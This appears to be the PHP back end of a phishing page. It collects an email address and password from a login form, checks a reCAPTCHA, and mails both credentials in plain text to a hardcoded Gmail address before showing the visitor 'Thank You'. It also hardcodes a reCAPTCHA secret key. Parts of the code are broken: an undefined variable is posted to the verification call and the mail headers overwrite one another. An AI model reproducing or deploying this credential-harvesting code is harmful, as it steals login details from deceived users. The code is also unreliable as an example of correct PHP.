<?php
    $secret_key='6LfT9AgqAAAAAEsigaJwIUnyn14Cswe65PJN4gOA';
    $recipient_email='citybusguide2024@gmail.com';
    $postData=$valErr=$statusMsg='';
    $status='error';
    if(isset($_POST['submit_frm'])){
        $postData=$_POST;
        $email=trim($_POST['email']);
        $password=trim($_POST['pass']);
        
        if(empty($email) || empty($password)){
            $valErr.='Please Enter a valid email and Pass';
    }
        if(empty($valErr)){
            if(isset($_POST['g-recaptcha-response'])&& !empty($_POST['g-recaptcha-response']) ){
                $api_url='https://www.google.com/recaptcha/api/siteverify';
            $recaptcha_data = array(
                'secret' => $secret_key,
                'response' => $_POST['g-recaptcha-response'],
                'remote_ip' =>$_SERVER['REMOTE_ADDR']
            );
            $curlConfig=array(
                CURLOPT_URL=>$api_url,CURLOPT_POST=>true,CURLOPT_RETURNTRANSFER=>true,CURLOPT_POSTFIELDS=>$resq_data
            );
            $ch=curl_init();
            curl_setopt_array($ch, $curlConfig);
            $response = curl_exec($ch);
            curl_close($ch);
            $responseData=json_decode($response,true);
            if($responseData->success){
                $to=$recipient_email;
                $subject= 'New Data';
                $htmlContent="
                <h4>Data</h4>
                <p><b>Email:</b>".$email."</p>
                <p><b>Password:</b>".$password."</p>";
                $headers="MIME-Version: 1.0" . "\r\n";
                $headers="Content-type:text/html;charset=UTF-8" ."\r\n";
                $headers='From:' .$email.' <'.$password.'>' . "\r\n";
                mail($to, $subject, $htmlContent, $headers);
                $status='success';
                $statusMsg='Thank You';
                $postData='';
            }
            else{
                $statusMsg='The recaptcha Verification Failed';
            }

            }
        }
        else{
            
            
        }
    }
    else{

    }
?>